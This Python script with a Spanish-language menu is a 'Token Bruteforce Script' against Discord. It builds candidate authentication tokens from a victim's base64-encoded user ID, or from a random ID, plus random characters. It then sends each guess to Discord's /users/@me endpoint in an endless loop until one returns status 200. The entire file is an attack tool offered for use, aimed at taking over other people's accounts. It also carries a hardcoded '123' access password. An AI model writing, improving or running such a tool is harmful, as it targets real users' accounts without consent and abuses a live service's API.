import time
import os
import base64
import random
import requests
from colorama import Fore, Style
from tkinter import messagebox


class Bruteforce:
    def __init__(self):
        self.request_url = "https://discordapp.com/api/v9/users/@me"

    def generate_token(self, id_encode):
        caracteres = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._'
        return id_encode + ''.join(random.choices(caracteres, k=35))

    def perform_bruteforce(self, id_encode):
        while True:
            try:
                token = self.generate_token(id_encode)
                headers = {'Authorization': token, 'Content-Type': 'application/json'}
                req = requests.get(self.request_url, headers=headers)

                if req.status_code == 401:
                    print(f"{Fore.RED}[$]{Style.RESET_ALL}    {Fore.RED}Inválido:{Style.RESET_ALL} {token}")
                elif req.status_code == 200:
                    print(f"{Fore.GREEN}[$]{Style.RESET_ALL}    {Fore.GREEN}Válido:{Style.RESET_ALL} {token}")
                    messagebox.showinfo(message="¡Token encontrado!", title="[$] Token Bruteforce Script")
                    break
            except requests.RequestException as e:
                print(f"{Fore.RED}[$]{Style.RESET_ALL}    Error de red: {e}")
                break
            except KeyboardInterrupt:
                print(f"{Fore.CYAN}[$]{Style.RESET_ALL}    Bruteforce terminado")
                break

    def bruteforce_by_id(self, user_id):
        if user_id.isdigit() and len(user_id) < 19:
            id_encode = base64.b64encode(user_id.encode("UTF-8")).decode("UTF-8")
            self.perform_bruteforce(id_encode)
        else:
            print(f"{Fore.CYAN}[$]{Style.RESET_ALL}    ID inválida, inténtelo de nuevo")

    def bruteforce_random(self):
        user_id = ''.join(random.choices('0123456789', k=18))
        id_encode = base64.b64encode(user_id.encode("UTF-8")).decode("UTF-8")
        self.perform_bruteforce(id_encode)


class App:
    def __init__(self):
        self.bruteforce = Bruteforce()

    def banner(self):
        print(f"{Fore.CYAN}")
        print("""                      ███████╗██████╗ ▄▄███▄▄·
                      ╚══███╔╝██╔══██╗██╔════╝
                        ███╔╝ ██║  ██║███████╗
                       ███╔╝  ██║  ██║╚════██║
                      ███████╗██████╔╝███████║
                      ╚══════╝╚═════╝ ╚═▀▀▀══╝""")
        print("                                                                  ")
        print("   ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗██████╗ ███████╗   ")
        print("   ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║██╔══██╗██╔════╝   ")
        print("      ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║██████╔╝█████╗     ")
        print("      ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║██╔══██╗██╔══╝     ")
        print("      ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║██████╔╝██║        ")
        print("      ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═════╝ ╚═╝        ")
        print("")

    def menu(self):
        os.system("@title   [$]  Token Bruteforce Script  && cls")
        self.banner()
        print(f"{Fore.BLUE}[$]{Style.RESET_ALL}    Dev: O{Fore.BLUE}${Fore.WHITE}int <3")
        print("")
        print(f"{Fore.BLUE}[$]{Style.RESET_ALL}    Escoja una opción a realizar: ")
        print("")
        print(f"{Fore.BLUE}[1]{Style.RESET_ALL}    Token Bruteforce por ID")
        print(f"{Fore.BLUE}[2]{Style.RESET_ALL}    Token Bruteforce random")
        print(f"{Fore.BLUE}[3]{Style.RESET_ALL}    Leave")
        print("")
        opcion = input(f"{Fore.BLUE}[$]{Style.RESET_ALL}    Opción a escoger: ")

        if opcion == "1":
            self.id_bruteforce()
        elif opcion == "2":
            self.bruteforce_random()
        elif opcion == "3":
            self.leave()
        else:
            self.invalid_option()

    def id_bruteforce(self):
        print(f"{Fore.BLUE}[$]{Style.RESET_ALL}    ID a realizar el Bruteforce:", end=" ")
        user_id = input()
        self.bruteforce.bruteforce_by_id(user_id)

    def bruteforce_random(self):
        self.bruteforce.bruteforce_random()

    def leave(self):
        os.system("@title   [$]  Leave  && cls")
        self.banner()
        print(f"{Fore.CYAN}[$]{Style.RESET_ALL}    Gracias por probar el script de bruteforce")
        time.sleep(3)
        exit()

    def invalid_option(self):
        os.system("@title   [$]  Acceso denegado  && cls")
        self.banner()
        print(f"{Fore.CYAN}[$]{Style.RESET_ALL}    Escoja una opción válida")
        input()
        self.menu()

    def run(self):
        os.system("@title   [$]  Conectando a herramienta...  && cls")
        self.banner()
        print(f"{Fore.BLUE}[$]{Style.RESET_ALL}    Dev: O{Fore.BLUE}${Fore.WHITE}int <3")
        print("")
        print(f"{Fore.BLUE}[$]{Style.RESET_ALL}    Conectando a la herramienta...")
        time.sleep(2)
        os.system("@title   [$]  Token Bruteforce Script  && cls")
        self.banner()
        print(f"{Fore.BLUE}[$]{Style.RESET_ALL}    Dev: O{Fore.BLUE}${Fore.WHITE}int <3")
        print("")
        print(
            f"{Fore.BLUE}[$]{Style.RESET_ALL}    Escriba la contraseña para continuar: ", end=f"{Fore.WHITE}")
        contraseña = input()

        if contraseña == "123":
            os.system("@title   [$]  Acceso concedido  && cls")
            self.banner()
            print(f"{Fore.BLUE}[$]{Style.RESET_ALL}    Acceso concedido.")
            time.sleep(3)
            self.menu()
        else:
            os.system("@title   [$]  Acceso denegado  && cls")
            self.banner()
            print(f"{Fore.CYAN}[$]{Style.RESET_ALL}    Acceso denegado")
            input()
            self.menu()


if __name__ == "__main__":
    app = App()
    app.run()



